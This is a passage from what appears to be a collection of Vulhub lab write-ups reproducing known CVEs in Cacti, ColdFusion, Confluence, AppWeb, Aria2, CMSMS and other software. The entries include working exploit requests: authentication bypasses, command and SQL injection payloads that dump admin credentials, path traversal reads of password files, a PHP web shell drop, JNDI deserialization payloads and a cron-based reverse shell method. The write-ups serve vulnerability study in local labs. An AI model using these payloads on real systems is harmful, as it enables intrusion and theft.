User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Connection: close
CMD: id
Cache-Control: max-age=0






As you can see, the command in CMD header is executed by Apache APISIX.
-------------------------------------------------------------------------------","https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232/
https://github.com/wuppp/cve-2021-45232-exp"
appweb,CVE-2018-8715,AppWeb Authentication Bypass vulnerability (CVE-2018-8715),"AppWeb Authentication Bypass vulnerability (CVE-2018-8715)

中文版本(Chinese version)

AppWeb is an embedded Web Server based on an open source GPL agreement that was developed and maintained by Embedthis Software LLC. It is written in C/C++ and can run on almost any modern operating system. Of course, it aims to provide a Web Application container for embedded devices.

AppWeb can be configured for authentication, which includes the following three authentication methods:
basic, traditional HTTP basic authentication
digest, improved HTTP basic authentication. At this mode, the Cookie will be used to authentication instead of Authorization header.
form, HTML based form authentication

In the Appweb versions before 7.0.3, have a logic flaw related to the authCondition function in http/httpLib.c. With a forged HTTP request, it is possible to bypass authentication for the form and digest login types.

Reference link:
https://ssd-disclosure.com/index.php/archives/3676

Vulnerability environment

Launch an Appweb 7.0.1 server with digest authentication by executing the following command:


docker compose up -d


To access http://your-ip:8080, you need to enter your account password.

Exploit

The current username is admin, so you can use following request to bypass the authentication:


GET / HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Digest username=admin




As you can see, since we did not pass in the password field, the server error occurred with a 200 status code and the session setting header:



The page can be accessed normally with this session header:
-------------------------------------------------------------------------------",https://ssd-disclosure.com/index.php/archives/3676
aria2,Unknown,Aria2 Arbitrary File Write Vulnerability,"Aria2 Arbitrary File Write Vulnerability

中文版本(Chinese version)

Aria2 is a lightweight, multi-protocol, multi-source download tool (supports HTTP/HTTPS, FTP, BitTorrent, Metalink) with built-in XML-RPC and JSON-RPC interfaces.

We can use the RPC interface to operate aria2 and download files to any directory, causing an arbitrary file write vulnerability.

Reference article:
https://paper.seebug.org/120/

Vulnerable Environment

Start the vulnerable environment：


docker compose up -d


6800 is the default port of aria2's rpc service. After the environment is started, access http://your-ip:6800/, and the service should return a 404 page.

Exploit

Because rpc communication requires json or xml, it is not convenient, so we can use a third-party UI to communicate with the target, such as http://binux.github.io/yaaw/demo/

Open yaaw, click the configure button and fill in the target domain name running aria2: http://your-ip:6800/jsonrpc:



Then click ""Add +"" to add a new download task. Fill in the ""Dir"" field with directory you want your file to be downloaded to and fill in the ""File Name"" field with the desired file name . For example, we will download a reverse shell by writing a crond task:



At this time, arai2 will download the malicious file (the URL you specified) to the /etc/cron.d/ directory, with the file name ""shell"". In debian, all files in the /etc/cron.d directory will be read as a scheduled task configuration file (like crontab). Once written we can must wait for upto a minute before the reverse shell script is executed:



If the reverse shell is unsuccessful, note the format of the crontab file, and the newline must be \n, and a newline is required at the end of the file.

Of course, we can also try to write other files, for more ways to exploit this vulnerability please refer to [this article][1]

[1]: https://paper.seebug.org/120/
-------------------------------------------------------------------------------","https://paper.seebug.org/120/
http://binux.github.io/yaaw/demo/
https://paper.seebug.org/120/"
bash,CVE-2014-6271,Bash Shellshock Remote Command Injection (CVE-2014-6271),"Bash Shellshock Remote Command Injection (CVE-2014-6271)

中文版本(Chinese version)

Build and run the vulnerable environment：


docker compose build
docker compose up -d


When you visit http://your-ip/ you should see two files:
safe.cgi
victim.cgi

safe.cgi generated by the latest version of bash, and victim.cgi is the page generated by bash4.3 which is vulnerable to shellshock.

We can send include our payload in the user-agent string when visiting victim.cgi and the command is executed successfully:



The same request sent to safe.cgi is unaffected:
-------------------------------------------------------------------------------",
cacti,CVE-2022-46169,Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169),"Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169)

中文版本(Chinese version)

Cacti is a robust and extensible operational monitoring and fault management framework for users around the world. A command injection vulnerability allows an unauthenticated user to execute arbitrary code on a server running Cacti prior from version 1.2.17 to 1.2.22, if a specific data source was selected for any monitored device.

References:
<https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
<https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A

Vulnerability Environment

Execute following command to start a Cacti server 1.2.22:


docker compose up -d


After the server is started, you will see the login page at http://localhost:8080.

Then login as admin/admin, follow the instructions to initialize the application. Actually, just click the ""next button"" again and again before you see the success page.



Before you can exploit this vulnerability, you have to add a new ""Graph"" because the command injection is occurred not in the default graph type:



Select the graph type ""Device - Uptime"", and click the ""Create"" button:



Exploit

After complete the above initialization, you will change your role to a attacker. Just send following request to Cacti server to trigger the command injection attack:


GET /remoteagent.php?action=polldata&localdataids[0]=6&hostid=1&poller_id=touch+/tmp/success HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost.lan
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1






Although no command result in the response, you can find the /tmp/success has been touched successfully.
-------------------------------------------------------------------------------","https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A"
cacti,CVE-2023-39361,Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459),"Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459)

中文版本(Chinese version)

Cacti is a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality, providing network managers with an intuitive interface to network data.

In Cacti versions 1.2.24 and earlier, a critical vulnerability exists in graph_view.php that allows guest users to perform SQL injection via the 'rfilter' parameter. When guest access is enabled, attackers can potentially cause significant damage, including remote code execution.

References:
<https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg
<https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv

Environment Setup

Execute the following command to start a Cacti 1.2.24 server:


docker compose up -d


After the server starts, you can access the Cacti interface at http://your-ip:8080. The default credentials are admin/admin.

Log in as admin and follow the initialization instructions. Simply click the ""Next"" button repeatedly until you see the success page.

Before exploiting the vulnerability without authentication, you must enable guest access. Log in as admin, navigate to Configuration -Authentication, and enable the guest user:



Vulnerability Reproduction

The vulnerability exists in the growrightpanetree function in graphview.php. When the 'action' parameter is set to 'treecontent', the user input ('rfilter' parameter) is validated through the htmlvalidatetreevars function, but this validation only ensures that the input is a valid regular expression and doesn't prevent SQL injection.

The SQL injection occurs because the rfilter parameter is directly inserted into a SQL query with double quotes, allowing attackers to escape the query context and inject malicious SQL code.

To exploit this vulnerability, send a request to the graph_view.php endpoint with the following parameters:


http://your-ip:8080/graphview.php?action=treecontent&node=1-1-treeanchor&rfilter=aaaaaaa""%20OR%20""""=""((""))%20UNION%20SELECT%201,2,(select%20concat(id,0x23,username,0x23,password)%20from%20userauth%20limit%201),4,5,6,(select%20user()),(select%20version()),9,10%23


The output reveals database information and admin account password:



Since Cacti supports stacked queries, you can leverage this vulnerability along with CVE-2024-31459 to achieve local file inclusion.

First, add a new plugin hook that points to the log/cacti.log file:


http://your-ip:8080/graphview.php?action=treecontent&node=1-1-treeanchor&rfilter=aaaaa""%20OR%20""""=""((""));INSERT%20INTO%20pluginhooks(name,hook,file,status)%20VALUES%20(""."",""login_before"",""../log/cacti.log"",1);%23


Then, write PHP code to the log/cacti.log file using an error-based SQL injection:


http://your-ip:8080/graphview.php?action=treecontent&node=1-1-tree_anchor&rfilter=aaaaa""%20OR%20""""=""((""))%20UNION%20SELECT%201,2,3,4,5,6,updatexml(rand(),concat(0x7e,""<?php%20phpinfo();?"",0x7e),null),8,9,10%23


Now, the PHPINFO function will execute and display when accessing the login page, confirming successful remote code execution:
-------------------------------------------------------------------------------","https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg
https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv"
cacti,CVE-2025-24367,Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367),"Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367)

中文版本(Chinese version)

Cacti is a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality. Versions of Cacti up to 1.2.28 have a argument injection vulnerability that allows authenticated users to create arbitrary PHP files on the web server, potentially leading to remote code execution.

The vulnerability occurs in the graph template functionality where user input for RRDTool command parameters, such as --right-axis-label, is not properly sanitized. While Cacti attempts to escape shell metacharacters using cacti_escapeshellarg(), it fails to handle newline characters. This allows attackers to break out of the intended command context and inject additional RRDTool commands, resulting in the ability to write malicious PHP files to the web root.

References:
<https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq
<https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0

Environment Setup

Execute the following command to start Cacti 1.2.28:


docker compose up -d


After the service is started, you can access http://your-ip:8080 to visit Cacti. The default credentials are admin/admin.

Log in as admin and follow the initialization instructions. Simply click the ""Next"" button repeatedly until you see the success page.

Vulnerability Reproduction

First, you need to log in to Cacti. On the Cacti console, navigate to ""Console → Templates → Graph"" and find the ""PING - Advanced Ping"" template and edit it. Submit and capture the request, then modify the rightaxislabel parameter to the following payload (please take care of the line breaks %0a):


XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph vulhub.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=phpinfo();?




Then, navigate to ""Console → Create → New Graphs"" and create a new graph with the ""PING - Advanced Ping"" template:



After that, navigate to ""Graphs → Default Tree → Local Linux Machine"" to trigger the payload execution.



You will see an image with error message ""Error: creating arguments"", which means the payload has been executed.

Our payload will create two files: a RRD file (my.rrd) and a PHP web shell (vulhub.php) in the Cacti web root:
-------------------------------------------------------------------------------","https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq
https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0
http://your-ip:8080"
celery,Unknown,Celery <4.0 Redis unauthorized access + Pickle deserialization exploit,"Celery <4.0 Redis unauthorized access + Pickle deserialization exploit

中文版本(Chinese version)

Celery is a simple, flexible, and reliable distributed system that processes a large number of messages while providing the tools needed to operate and maintain such a system. It is a task queue focused on real-time processing and also supports task scheduling.

In Celery <4.0 version, Pickle is used by default for serialized task messages. When the queue service（e.g. Redis/RabbitMQ/RocketMQ ） used has an unauthorized access problem, the Pickle deserialization vulnerability can be used to execute arbitrary code.

Vulnerability Environment

Execute the following command to start Celery 3.1.23 + Redis:

bash
docker compose up -d


Exploit

The exploit script exploit.py only supports use under python3

bash
pip install redis
python exploit.py [Host IP]


View Results：


docker compose logs celery


You can see the following task message error：



bash
docker compose exec celery ls -l /tmp


You can see that the file celery_success was successfully created



Reference

https://docs.celeryproject.org/en/stable/userguide/configuration.html

https://www.bookstack.cn/read/celery-3.1.7-zh/8d5b10e3439dbe1f.md#dhfmrk

https://docs.celeryproject.org/en/stable/userguide/calling.html#serializers

https://www.jianshu.com/p/52552c075bc0

https://www.runoob.com/w3cnote/python-redis-intro.html

https://blog.csdn.net/SKI_12/article/details/85015803
-------------------------------------------------------------------------------",
cgi,CVE-2016-5385,CGI Application Environment Variable Injection by HTTPoxy (CVE-2016-5385),"CGI Application Environment Variable Injection by HTTPoxy (CVE-2016-5385)

中文版本(Chinese version)

httpoxy is a set of vulnerabilities that affect application code running in CGI, or CGI-like environments. It comes down to a simple namespace conflict:
RFC 3875 (CGI) puts the HTTP Proxy header from a request into the environment variables as HTTP_PROXY
HTTP_PROXY is a popular environment variable used to configure an outgoing proxy

This leads to a remotely exploitable vulnerability. See <https://httpoxy.orgfor further principles description.

CVE-2016-5385 is one of CVEs that assign for HTTPoxy, here are the full CVEs list:
CVE-2016-5385: PHP
CVE-2016-5386: Go
CVE-2016-5387: Apache HTTP Server
CVE-2016-5388: Apache Tomcat
CVE-2016-6286: spiffy-cgi-handlers for CHICKEN
CVE-2016-6287: CHICKEN’s http-client
CVE-2016-1000104: mod_fcgi
CVE-2016-1000105: Nginx cgi script
CVE-2016-1000107: Erlang inets
CVE-2016-1000108: YAWS
CVE-2016-1000109: HHVM FastCGI
CVE-2016-1000110: Python CGIHandler
CVE-2016-1000111: Python Twisted
CVE-2016-1000212: lighttpd

Vulnerable environment

Execute following command to start a Web application depending on PHP 5.6.23 and GuzzleHttp 6.2.0.


docker compose up -d


This Web page get its origin IP address at http://httpbin.org/get:



At this moment, hostname IP is equal to original IP, no HTTP proxy.

Exploit

Send a request with a crafted HTTP header that contains a available HTTP proxy address: Proxy: http://..122.65:8888/:



It is obvious that the original address in the response has become the IP address of the proxy server.

Start a Netcat server at the ..122.65 instead of HTTP proxy, we can capture the original request:
-------------------------------------------------------------------------------","https://httpoxy.org
http://*.*.122.65:8888/`:"
cmsms,CVE-2019-9053,CMS Made Simple (CMSMS) < 2.2.10 Unauthenticated SQL Injection (CVE-2019-9053),"CMS Made Simple (CMSMS) < 2.2.10 Unauthenticated SQL Injection (CVE-2019-9053)

中文版本(Chinese version)

CMS Made Simple (CMSMS) is a free, open source content management system to provide developers, programmers and site owners a web-based development and administration area.

In the version prior to 2.2.9.1, CMS Made Simple was affected by a unauthenticated SQL injection attack, which attacker is able to gain the administrator's password or password reset token. Combining the authenticated SSTI issue (CVE-2021-26120), could allow an attacker to execute arbitrary code on the target server.

References:
<https://www.exploit-db.com/exploits/46635
<https://srcincite.io/pocs/cve-2021-26120.py.txt

Vulnerable Environment

Execute following command to start a CMS Made Simple 2.2.9.1:


docker compose up -d


After the server is started, you should install the CMS at http://your-ip/install.php.

Following the install instructions to install the CMSMS, MySQL database address is db, database name is cmsms, username and password are both root.



Exploit

Use the script on <https://www.exploit-db.com/exploits/46635to exploit the SQL injection vulnerability:


python2 poc.py -u http://127.0.0.1




As you can see, the administrator's password is exposed by SQL injection.
-------------------------------------------------------------------------------","https://www.exploit-db.com/exploits/46635
https://srcincite.io/pocs/cve-2021-26120.py.txt
https://www.exploit-db.com/exploits/46635
http://127.0.0.1"
cmsms,CVE-2021-26120,CMS Made Simple (CMSMS) Unauthenticated Remote Code Execution (CVE-2019-9053/CVE-2021-26120),"CMS Made Simple (CMSMS) Unauthenticated Remote Code Execution (CVE-2019-9053/CVE-2021-26120)

中文版本(Chinese version)

CMS Made Simple (CMSMS) is a free, open source content management system to provide developers, programmers and site owners a web-based development and administration area.

Smarty before 3.1.39 allows code injection via an unexpected function name after a {function name= substring, CVE-2021-26120 was assigned to this issue.

CMS Made Simple version <= 2.2.15, a user that is authenticated with designer permissions can trigger a server side template injection, the CVE-2021-26120 mentioned above.

So, if the CMSMS version is prior to 2.2.9.1, unauthencated attacker is able to chain CVE-2019-9053 and CVE-2021-26120 to execute arbitrary code in the server.

References:
<https://srcincite.io/pocs/cve-2021-26120.py.txt
<https://www.exploit-db.com/exploits/46635

Vulnerable Environment

Execute following command to start a CMS Made Simple 2.2.9.1:


docker compose up -d


After the server is started, you should install the CMS at http://your-ip/install.php.

Following the install instructions to install the CMSMS, MySQL database address is db, database name is cmsms, username and password are both root.



Exploit

Use the POC inside the <https://srcincite.io/pocs/cve-2021-26120.py.txtto reset the administrator password and execute arbitrary commands:


python poc.py 127.0.0.1 / id




As you can see, id command has been executed.
-------------------------------------------------------------------------------","https://srcincite.io/pocs/cve-2021-26120.py.txt
https://www.exploit-db.com/exploits/46635
https://srcincite.io/pocs/cve-2021-26120.py.txt"
coldfusion,CVE-2023-29300,Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300),"Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)

中文版本(Chinese version)

Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.

Adobe ColdFusion versions 2018 Update 16 (and earlier), 2021 Update 6 (and earlier) and 2023.0.0.330468 (and earlier) are affected by a deserialization of untrusted data vulnerability. Attacker is able to call arbitrary setter function and execute arbitrary commands eventually.

References:
<https://blog.projectdiscovery.io/adobe-coldfusion-rce/
<https://xz.aliyun.com/t/13413

Vulnerable environment

Start a Adobe ColdFusion 2018.0.15:


docker compose up -d


After a few minutes wait, visit http://your-ip:8500/CFIDE/administrator/index.cfm with password vulhub, you can install the Adobe ColdFusion successfully.

Exploit

To exploit this issue, you have to find a valid gadget to execute arbitrary code in ColdFusion server. The most common gadget is com.sun.rowset.JdbcRowSetImpl that uses the JNDI injection to execute the command.

We utilize the Java Chains tool for vulnerability reproduction. To get started with Java Chains, please visit the Quick Start guide.  Then, following the instructions in the screenshot below, generate a payload based on the CommonsBeanutils1 exploit chain.



Then, send the following request to ColdFusion server (replace with your LDAP server address):


POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 333

argumentCollection=<wddxPacket version='1.0'<header/<data<struct type='xcom.sun.rowset.JdbcRowSetImplx'<var name='dataSourceName'<stringldap://your.ldap.server/example</string</var<var name='autoCommit'<boolean value='true'/</var</struct</data</wddxPacket


As you can see, the touch /tmp/success is executed successfully:
-------------------------------------------------------------------------------","https://blog.projectdiscovery.io/adobe-coldfusion-rce/
https://xz.aliyun.com/t/13413"
coldfusion,CVE-2023-26360,Adobe ColdFusion Local File Inclusion Leads to RCE (CVE-2023-26360),"Adobe ColdFusion Local File Inclusion Leads to RCE (CVE-2023-26360)

中文版本(Chinese version)

Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.

Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by an Improper Access Control vulnerability that could result in local file inclusion and arbitrary code execution in the context of the current user.

References:
<https://xz.aliyun.com/t/13392

Vulnerable environment

Start a Adobe ColdFusion 2018.0.15:


docker compose up -d


After a few minutes wait, visit http://your-ip:8500/CFIDE/administrator/index.cfm with password vulhub, you can install the Adobe ColdFusion successfully.

Exploit

Simply send following request to server to download /proc/self/environ:


POST /cfscripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&cfclient=true HTTP/1.1
Host: localhost:8500
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 82
Content-Type: application/x-www-form-urlencoded

variables={""metadata"":{""classname"":""../../../../../../../../proc/self/environ""}}


Then you will find the base directory /opt/coldfusion/cfusion of Adobe ColdFusion:



Retrieve password by ../../../../../../../../opt/coldfusion/cfusion/lib/password.properties:



To exploit the arbitrary code execution issue, first send a request to the server containing a CFM script:


POST /cfscripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&cfclient=true HTTP/1.1
Host: localhost:8500
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 67
Content-Type: application/x-www-form-urlencoded

_variables=<cfexecute name='id' outputFile='/tmp/success' </cfexecute


Then, include the log file to execute the CFM script:


POST /cfscripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&cfclient=true HTTP/1.1
Host: localhost:8500
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 111
Content-Type: application/x-www-form-urlencoded

variables={""metadata"":{""classname"":""../../../../../../../../opt/coldfusion/cfusion/logs/coldfusion-out.log""}}


The id command is executed and output to /tmp/success:
-------------------------------------------------------------------------------",https://xz.aliyun.com/t/13392
coldfusion,CVE-2017-3066,Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066),"Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066)

中文版本(Chinese version)

Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.

Adobe ColdFusion 2016 Update 3 and earlier, ColdFusion 11 update 11 and earlier, ColdFusion 10 Update 22 and earlier have a Java deserialization vulnerability in the Apache BlazeDS library. Successful exploitation could lead to arbitrary code execution.

References:
https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html
https://www.exploit-db.com/exploits/43993
https://github.com/codewhitesec/ColdFusionPwn

Vulnerable environment

Start a Adobe ColdFusion 11 update 3:


docker compose up -d


After a few minutes wait, visit http://your-ip:8500/CFIDE/administrator/index.cfm with password vulhub, you can install the Adobe ColdFusion successfully.

Exploit

Generate a POC via ColdFusionPwn in the poc.ser:


java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser


Send the request to http://your-ip:8500/flex2gateway/amf, which contains the application/x-amf Content-Type and POC within the body:


POST /flex2gateway/amf HTTP/1.1
Host: your-ip:8500
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-amf
Content-Length: 2853

[...poc...]




/tmp/success is successfully created:



Get a reverse shell:
-------------------------------------------------------------------------------","https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html
https://www.exploit-db.com/exploits/43993
https://github.com/codewhitesec/ColdFusionPwn"
coldfusion,CVE-2010-2861,Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861),"Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861)

中文版本(Chinese version)

Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.

There is a directory traversal vulnerability in the Adobe ColdFusion 9.0.1 and earlier, which allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.

Environment setup

Execute the following command to start Adobe CouldFusion 8.0.1 server:


docker compose up -d


The server startup may take 1~5 minutes. After that, visit http://your-ip:8500/CFIDE/administrator/enter.cfm to see the initialization page, enter the password admin to initialize the entire server.

POC

Read the file /etc/passwd via http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en:



Read the background administrator password via http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/ password.properties%00en:
-------------------------------------------------------------------------------",
confluence,CVE-2019-3396,Atlassian Confluence Path Traversal Leads to RCE (CVE-2019-3396),"Atlassian Confluence Path Traversal Leads to RCE (CVE-2019-3396)

中文版本(Chinese version)

Confluence is a web-based corporate wiki developed by Australian software company Atlassian.

An unauthorized directory traversal vulnerability exists before version 6.14.2 of Atlassian Confluence, which an attacker can read arbitrary files or execute arbitrary commands using Velocity template injection.

Reference:
https://paper.seebug.org/884/
https://jira.atlassian.com/browse/CONFSERVER-57974

Vulnerability Environment

Start a Confluence Server 6.10.2 by executing the following command.


docker compose up -d


After the environment starts, visit http://your-ip:8090 and you will see the installation guide, select ""Trial installation"", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian:



Then just click Next to install. This step of small memory VPS may fail to install or take a long time (it is recommended to use a machine with more than 4G memory for installation and testing), please wait patiently.

If prompted to fill in the cluster node, the path can be filled in with /home/confluence.



You may be asked to fill in the database account password, choose the postgres database, the address is db, the account password is postgres:



Exploit

The file web.xml can be read by sending the following packet.


POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 176

{""contentId"": ""786458"", ""macro"":{""name"": ""widget"", ""body"":"""", ""params"":{""url"": ""https://www.viddler.com/v/23464dc6"", ""width"": ""1000"","" height"": ""1000"",""_template"":"". /web.xml""}}}




Confluence before 6.12 did not restrict the protocol and path for file reading, we can use file:///etc/passwd to read files, or https://... to load remote files.

If the file is a Velocity template, and we can execute arbitrary commands via template injection (SSTI):
-------------------------------------------------------------------------------","https://paper.seebug.org/884/
https://jira.atlassian.com/browse/CONFSERVER-57974
http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&"
confluence,CVE-2023-22515,Atlassian Confluence Access Control Broken by Attributes Overwrite (CVE-2023-22515),"Atlassian Confluence Access Control Broken by Attributes Overwrite (CVE-2023-22515)

中文版本(Chinese version)

Confluence is a web-based corporate wiki developed by Australian software company Atlassian.

On October 4, 2023, Atlassian published a security advisory on CVE-2023-22515, a critical vulnerability affecting on-premises instances of Confluence Server and Confluence Data Center. CVE-2023-22515 was originally announced as a privilege escalation vulnerability, but was later changed to a broken access control flaw.

Versions prior to 8.0.0 are not affected by this vulnerability.

References:
<https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
<https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis

Vulnerable Environment

Execute following command to start a Confluence Server 8.5.1:


docker compose up -d


After the environment starts, visit http://your-ip:8090 and you will see the installation guide, select ""Trial installation"", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.

Following this guide to complete the installation.

On the database configuration page, fill in the form with database address db, database name confluence, username postgres, password postgres.



Exploit

Firstly, send the main request to overwrite the attribute bootstrapStatusProvider.applicationConfig.setupComplete:


GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0




Then, you will be able to create a administrator user vulhub through the website setup action:


POST /setup/setupadministrator.action HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
X-Atlassian-Token: no-check

username=vulhub&fullName=vulhub&email=admin%40vulhub.org&password=vulhub&confirm=vulhub&setup-next-button=Next


Optionally, send the following request to finish the setup wizard:


POST /setup/finishsetup.action HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
X-Atlassian-Token: no-check




Finally, you can simply login to the administrator panel with account vulhub and password vulhub:
-------------------------------------------------------------------------------","https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis"
confluence,CVE-2022-26134,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134),"Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134)

中文版本(Chinese version)

Confluence is a web-based corporate wiki developed by Australian software company Atlassian.

On June 02, 2022 Atlassian released a security advisory for their Confluence Server and Data Center applications, highlighting a critical severity unauthenticated remote code execution vulnerability. The OGNL injection vulnerability allows an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance.

References:
<https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
<https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis

Vulnerable Environment

Execute following command to start a Confluence Server 7.13.6:


docker compose up -d


After the environment starts, visit http://your-ip:8090 and you will see the installation guide, select ""Trial installation"", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.

Following this guide to complete the installation.

On the database configuration page, fill in the form with database address db, database name confluence, username postgres, password postgres.



Exploit

Simplely send following request to execute arbitrary commands inside an craft OGNL expression and get the response:


